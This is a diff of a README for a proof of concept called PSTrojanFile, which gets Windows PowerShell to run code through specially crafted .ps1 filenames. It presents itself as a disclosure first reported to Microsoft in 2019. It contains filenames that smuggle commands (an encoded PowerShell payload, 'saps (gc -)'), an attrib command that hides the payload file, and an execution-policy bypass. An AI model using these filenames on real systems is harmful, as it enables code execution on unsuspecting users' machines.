@@ -1,9 +1,9 @@
 # PSTrojanFile
 Windows PowerShell Filename Code Execution POC
 
-Dusted off and improved: <br> 
+Since it still works, I dusted off and made minor improvements: <br> 
 1) Execute a remote DLL using rundll32
-2) Execute an unintended secondary PS1 script or hidden text-file
+2) Execute an unintended secondary PS1 script or local text-file (can be hidden)
 3) Updated the PS1 Trojan Filename Creator Python3 Script
 
 First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
@@ -15,7 +15,7 @@ Test;POweRsHeLL -e [BASE64 UTF-16LE PAYLOAD];.ps1 <br>
 
 Call commands straight away <br>  
 
-"Testing;saps (gc -) PoC.ps1"
+"Testing;saps (gc -) PoC;.ps1"
 
 Vectors: double click, drag and drop to PS shortcut
 
@@ -65,7 +65,7 @@ Text-file Code Execution Example: <br>
 
 Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file. <br>  
 
-"Test;saps (gc -) PoC.ps1" <br>  
+"Test;saps (gc -) PoC;.ps1" <br>  
 
 Create hidden: attrib +s +h "-" <br>  
 
@@ -78,7 +78,7 @@ a) PowerShell PS1 files must be set to open with PowerShell as the default progr
 
 b) Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force <br>  
 
-c) User must double-click or drag and drop the maliciously named PS1 script <br>  
+c) User must double-click, run from cmd line or drag and drop the maliciously named PS1 script <br>  
 
 
 
